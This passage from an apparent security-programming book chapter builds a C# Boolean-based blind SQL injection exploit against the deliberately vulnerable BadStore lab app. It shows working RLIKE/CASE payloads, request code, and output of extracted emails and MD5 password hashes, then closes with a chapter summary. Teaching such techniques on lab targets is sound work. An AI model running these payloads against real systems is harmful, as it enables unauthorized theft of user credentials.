class="calibre4">i</span> equals the integer <span class="calibre4">c</span> of the inner loop. We then cast <span class="calibre4">c</span> to a <span class="calibre4">byte</span> and add it to a <span class="calibre4">List&lt;byte&gt;</span> ➑ instantiated before looping. Finally, we break out of the inner loop to iterate through the outer loop and, once the <span class="calibre4">for</span> loops have completed, we convert the <span class="calibre4">List&lt;byte&gt;</span> into a printable string.</p><p class="calibre_6">This string is then printed to the screen, as shown in <a href="#filepos223808">Listing 2-45</a>.</p><blockquote class="calibre_14"><span class="calibre4"> int count = int.Parse(Encoding.ASCII.➊GetString(countBytes.ToArray()));</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("There are "+count+" rows in the userdb table"); </span><a id="filepos223808"/><span class="calibre4"><span class="italic">Listing 2-45: Converting the string retrieved by the SQL injection and printing the number of rows in the table</span></span></blockquote><p class="calibre_6">We use the <span class="calibre4">GetString()</span> method ➊ (from the <span class="calibre4">Encoding.ASCII</span> class) to convert the array of bytes returned by <span class="calibre4">countBytes.ToArray()</span> into a human-readable string. This string is then passed to <span class="calibre4">int.Parse()</span>, which parses it and returns an integer (if the string can be converted to an integer). The string is then printed using <span class="calibre4">Console.WriteLine()</span>.</p><p class="calibre_10"><span class="calibre3"><span class="bold">The MakeRequest() Method</span></span></p><p class="calibre_11">We’re just about ready to run our exploit, save for one more thing: we need a way to send payloads within the <span class="calibre4">for</span> loops. To do so, we need to write the <span class="calibre4">MakeRequest()</span> method, which takes a single argument: the payload to send (see <a href="#filepos225672">Listing 2-46</a>).</p><blockquote class="calibre_14"><span class="calibre4">private static string MakeRequest(string payload)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> string url = ➊"http://192.168.1.78/cgi-bin/badstore.cgi?action=search&amp;searchquery=";</span><br class="calibre5"/><span class="calibre4"> HttpWebRequest request = (HttpWebRequest)WebRequest.➋Create(url+payload);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> string response = string.Empty;</span><br class="calibre5"/><span class="calibre4"> using (StreamReader reader = new ➌StreamReader(request.GetResponse().GetResponseStream()))</span><br class="calibre5"/><span class="calibre4"> response = reader.ReadToEnd();</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> return response;</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos225672" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-46: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">MakeRequest()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method sending the payload and returning the server’s response</span></span></p><p class="calibre_6">We create a basic GET <span class="calibre4">HttpWebRequest</span> ➋ using the payload and URL ➊ to the BadStore instance. Then, using a <span class="calibre4">StreamReader</span> ➌, we read the response into a string and return the response to the caller. Now we run the exploit and should receive something like the output shown in <a href="#filepos226465">Listing 2-47</a>.</p><blockquote class="calibre_14"><span class="calibre4">There are 23 rows in the userdb table </span><a id="filepos226465"/><span class="calibre4"><span class="italic">Listing 2-47: Determining the number of rows in the</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">userdb</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">table</span></span></blockquote><p class="calibre_6">After running the first piece of our exploit, we see we have 23 users to pull usernames and password hashes for. The next piece of the exploit will pull out the actual usernames and password hashes.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Retrieving the Lengths of the Values</span></span></p><p class="calibre_11">Before we can pull any values from the columns in the database, byte by byte, we need to get the lengths of the values. <a href="#filepos228309">Listing 2-48</a> shows how this can be done.</p><blockquote class="calibre_14"><span class="calibre4"> private static int GetLength(int row➊, string column➋)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> int countLength = 0;</span><br class="calibre5"/><span class="calibre4"> for (;; countLength++)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";</span><br class="calibre5"/><span class="calibre4"> getCountLength += " LENGTH(IFNULL(CAST(➌CHAR_LENGTH("+column+") AS";</span><br class="calibre5"/><span class="calibre4"> getCountLength += " CHAR),0x20)) FROM userdb ORDER BY email ➍LIMIT";</span><br class="calibre5"/><span class="calibre4"> getCountLength += row+",1)="+countLength+") THEN 0x28 ELSE 0x41 END)) AND";</span><br class="calibre5"/><span class="calibre4"> getCountLength += " 'YIye'='YIye";</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> string response = MakeRequest(getCountLength);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (response.Contains("parentheses not balanced"))</span><br class="calibre5"/><span class="calibre4"> break;</span><br class="calibre5"/><span class="calibre4"> }</span></blockquote><p id="filepos228309" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-48: Retrieving the length of certain values in the database</span></span></p><p class="calibre_6">The <span class="calibre4">GetLength()</span> method takes two arguments: the database row to pull the value from ➊ and the database column in which the value will reside ➋. We use a <span class="calibre4">for</span> loop (see <a href="#filepos230508">Listing 2-49</a>) to gather the length of the rows in the <span class="calibre4">userdb</span> table. But unlike in the previous SQL payloads, we use the function <span class="calibre4">CHAR_LENGTH()</span> ➌ instead of <span class="calibre4">LENGTH</span> because the strings being pulled could be 16-bit Unicode instead of 8-bit ASCII. We also use a <span class="calibre4">LIMIT</span> clause ➍ to specify that we want to pull the value from a specific row returned from the full users table. After retrieving the length of the value in the database, we can retrieve the actual value a byte at a time, as shown in <a href="#filepos230508">Listing 2-49</a>.</p><blockquote class="calibre_14"><span class="calibre4"> List&lt;byte&gt; countBytes = ➊new List&lt;byte&gt; ();</span><br class="calibre5"/><span class="calibre4"> for (int i = 0; i &lt;= countLength; i++)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> for (int c = 48; c &lt;= 58; c++)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string getLength = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";</span><br class="calibre5"/><span class="calibre4"> getLength += " IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),0x20) FROM";</span><br class="calibre5"/><span class="calibre4"> getLength += " userdb ORDER BY email LIMIT " + row + ",1)," + i;</span><br class="calibre5"/><span class="calibre4"> getLength += ",1))="+c+") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye";</span><br class="calibre5"/><span class="calibre4"> string response = ➋MakeRequest(getLength);</span><br class="calibre5"/><span class="calibre4"> if (response.➌Contains("parentheses not balanced"))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> countBytes.➍Add((byte)c);</span><br class="calibre5"/><span class="calibre4"> break;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span></blockquote><p id="filepos230508" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-49: The second loop within the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">GetLength()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method retrieving the actual length of the value</span></span></p><p class="calibre_6">As you can see in <a href="#filepos230508">Listing 2-49</a>, we create a generic <span class="calibre4">List&lt;byte&gt;</span> ➊ to store the values gleaned by the payloads so that we can convert them into integers and return them to the caller. As we iterate over the length of the count, we send HTTP requests to test the bytes in the value using <span class="calibre4">MakeRequest()</span> ➋ and the SQL injection payload. If the response contains the <span class="calibre4">"parentheses not balanced"</span> error ➌, we know our SQL payload evaluated to true. This means we need to store the value of <span class="calibre4">c</span> (the character that was determined to match <span class="calibre4">i</span>) as a byte ➍ so that we can convert the <span class="calibre4">List&lt;byte&gt;</span> to a human-readable string. Since we found the current character, we don’t need to test the given index of the count anymore, so we break to move on to the next index.</p><p class="calibre_6">Now we need to return the count and finish the method, as shown in <a href="#filepos232240">Listing 2-50</a>.</p><blockquote class="calibre_14"><span class="calibre4"> if (countBytes.Count &gt; 0)</span><br class="calibre5"/><span class="calibre4"> return ➊int.Parse(Encoding.ASCII.➋GetString(countBytes.ToArray()));</span><br class="calibre5"/><span class="calibre4"> else</span><br class="calibre5"/><span class="calibre4"> return 0;</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos232240" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-50: The final line in the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">GetLength()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method, converting the value for the length into an integer and returning it</span></span></p><p class="calibre_6">Once we have the bytes of the count, we can use <span class="calibre4">GetString()</span> ➋ to convert the bytes gathered into a human-readable string. This string is passed to <span class="calibre4">int.Parse()</span> ➊ and returned to the caller so that we can begin gathering the actual values from the database.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Writing GetValue() to Retrieve a Given Value</span></span></p><p class="calibre_11">We finish this exploit with the <span class="calibre4">GetValue()</span> method, as shown in <a href="#filepos234548">Listing 2-51</a>.</p><blockquote class="calibre_14"><span class="calibre4">private static string GetValue(int row➊, string column➋, int length➌)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> List&lt;byte&gt; valBytes = ➍new List&lt;byte&gt;();</span><br class="calibre5"/><span class="calibre4"> for (int i = 0; i &lt;= length; i++)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> ➎for(int c = 32; c &lt;= 126; c++)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string getChar = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";</span><br class="calibre5"/><span class="calibre4"> getChar += " IFNULL(CAST("+column+" AS CHAR),0x20) FROM userdb ORDER BY";</span><br class="calibre5"/><span class="calibre4"> getChar += " email LIMIT "+row+",1),"+i+",1))="+c+") THEN 0x28 ELSE 0x41";</span><br class="calibre5"/><span class="calibre4"> getChar += " END)) AND 'YIye'='YIye";</span><br class="calibre5"/><span class="calibre4"> string response = MakeRequest(getChar);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (response.Contains(➏"parentheses not balanced"))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> valBytes.Add((byte)c);</span><br class="calibre5"/><span class="calibre4"> break;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> return Encoding.ASCII.➐GetString(valBytes.ToArray());</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos234548" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-51: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">GetValue()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method, which will retrieve the value of a given column at a given row</span></span></p><p class="calibre_6"> The <span class="calibre4">GetValue()</span> method requires three arguments: the database row we are pulling the data from ➊, the database column in which the value resides ➋, and the length of the value to be gleaned from the database ➌. A new <span class="calibre4">List&lt;byte&gt;</span> ➍ is instantiated to store the bytes of the value gathered.</p><p class="calibre_6">In the innermost <span class="calibre4">for</span> loop ➎, we iterate from 32 to 126 because 32 is the lowest integer that corresponds to a printable ASCII character, and 126 is the highest. Earlier when retrieving the counts, we only iterated from 48 to 58 because we were only concerned with the numerical ASCII character.</p><p class="calibre_6">As we iterate through these values, we send a payload comparing the current index of the value in the database to the current value of the iteration of the inner <span class="calibre4">for</span> loop. When the response is returned, we look for the error <span class="calibre4">"parentheses not balanced"</span> ➏ and, if it is found, cast the value of the current inner iteration to a byte and store it in the list of bytes. The last line of the method converts this list to a string using <span class="calibre4">GetString()</span> ➐ and returns the new string to the caller.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Calling the Methods and Printing the Values</span></span></p><p class="calibre_11">All that is left now is to call the new methods <span class="calibre4">GetLength()</span> and <span class="calibre4">GetValue()</span> in our <span class="calibre4">Main()</span> method and to print the values gleaned from the database. As shown in <a href="#filepos237667">Listing 2-52</a>, we add the <span class="calibre4">for</span> loop that calls the <span class="calibre4">GetLength()</span> and <span class="calibre4">GetValue()</span> methods to the end of our <span class="calibre4">Main()</span> method so that we can extract the email addresses and password hashes from the database.</p><blockquote class="calibre_14"><span class="calibre4">for (int row = 0; row &lt; count; row++)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> foreach (string column in new string[] {"email", "passwd"})</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Console.Write("Getting length of query value... ");</span><br class="calibre5"/><span class="calibre4"> int valLength = ➊GetLength(row, column);</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine(valLength);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> Console.Write("Getting value... ");</span><br class="calibre5"/><span class="calibre4"> string value = ➋GetValue(row, column, valLength);</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine(value);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos237667" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-52: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">for</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">loop added to the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Main()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method, which consumes the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">GetLength()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">and</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">GetValue()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">methods</span></span></p><p class="calibre_6">For each row in the <span class="calibre4">userdb</span> table, we first get the length ➊ and value ➋ of the <span class="calibre4">email</span> field and then the value of the <span class="calibre4">passwd</span> field (an MD5 hash of the user’s password). Next, we print the length of the field and its value, with results like those shown in <a href="#filepos239699">Listing 2-53</a>.</p><blockquote class="calibre_14"><span class="calibre4">There are 23 rows in the userdb table</span><br class="calibre5"/><span class="calibre4">Getting length of query value... 13</span><br class="calibre5"/><span class="calibre4">Getting value... AAA_Test_User</span><br class="calibre5"/><span class="calibre4">Getting length of query value... 32</span><br class="calibre5"/><span class="calibre4">Getting value... 098F6BCD4621D373CADE4E832627B4F6</span><br class="calibre5"/><span class="calibre4"> Getting length of query value... 5</span><br class="calibre5"/><span class="calibre4">Getting value... admin</span><br class="calibre5"/><span class="calibre4">Getting length of query value... 32</span><br class="calibre5"/><span class="calibre4">Getting value... 5EBE2294ECD0E0F08EAB7690D2A6EE69</span><br class="calibre5"/><span class="calibre4">--</span><span class="calibre4"><span class="italic">snip</span></span><span class="calibre4">--</span><br class="calibre5"/><span class="calibre4">Getting length of query value... 18</span><br class="calibre5"/><span class="calibre4">Getting value... tommy@customer.net</span><br class="calibre5"/><span class="calibre4">Getting length of query value... 32</span><br class="calibre5"/><span class="calibre4">Getting value... 7f43c1e438dc11a93d19616549d4b701</span></blockquote><p id="filepos239699" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-53: The results of our exploit</span></span></p><p class="calibre_6">After enumerating the number of users in the database, we iterate over each user and pull the username and password hash out of the database. This process is much slower than the <span class="calibre4">UNION</span> we performed above, but <span class="calibre4">UNION</span> injections are not always available. Understanding how a Boolean-based attack works when exploiting SQL injections is crucial to effectively exploiting many SQL injections.</p><p id="filepos240292" class="calibre_10"><span class="calibre3"><span class="bold">Conclusion</span></span></p><p class="calibre_11">This chapter has introduced you to fuzzing for and exploiting XSS and SQL injection vulnerabilities. As you’ve seen, BadStore contains numerous SQL injection, XSS, and other vulnerabilities, all of which are exploitable in slightly different ways. In the chapter, we implemented a small GET request fuzzing application to search query string parameters for XSS or errors that could mean a SQL injection vulnerability exists. Using the powerful and flexible <span class="calibre4">HttpWebRequest</span> class to make and retrieve HTTP requests and responses, we were able to determine that the <span class="calibre4">searchquery</span> parameter, when searching for items in BadStore, is vulnerable to both XSS and SQL injection.</p><p class="calibre_6">Once we wrote a simple GET request fuzzer, we captured an HTTP POST request from BadStore using the Burp Suite HTTP proxy and Firefox in order to write a small fuzzing application for POST requests. Using the same classes as those in the previous GET requests fuzzer, but with some new methods, we were able to find even more SQL injection vulnerabilities that could be exploitable.</p><p class="calibre_6">Next, we moved on to more complicated requests, such as HTTP requests with JSON. Using a vulnerable JSON web application, we captured a request used to create new users on the web app using Burp Suite. In order to efficiently fuzz this type of HTTP request, we introduced the Json.NET library, which makes it easy to parse and consume JSON data.</p><p class="calibre_6">Finally, once you had a good grasp on how fuzzers can find possible vulnerabilities in web applications, you learned how to exploit them. Using BadStore again, we wrote a <span class="calibre4">UNION</span>-based SQL injection exploit that could pull out the usernames and password hashes in the BadStore database with a single HTTP request. In order to efficiently pull the extracted data out of the HTML returned by the server, we used the regular expression classes <span class="calibre4">Regex</span>, <span class="calibre4">Match</span>, and <span class="calibre4">MatchCollection</span>.</p><p class="calibre_6"> Once the simpler <span class="calibre4">UNION</span> exploit was complete, we wrote a Boolean-based blind SQL injection on the same HTTP request. Using the <span class="calibre4">HttpWebRequest</span> class, we determined which of the HTTP responses were true or false, based on SQL injection payloads passed to the web application. When we knew how the web application would behave in response to true-or-false questions, we began asking the database true-or-false questions in order to glean information from it 1 byte at a time. The Boolean-based blind exploit is more complicated than the <span class="calibre4">UNION</span> exploit and requires more time and HTTP requests to complete, but it is particularly useful when a <span class="calibre4">UNION</span> isn’t possible.</p><div class="mbp_pagebreak" id="calibre_pb_7"/>
</body></html>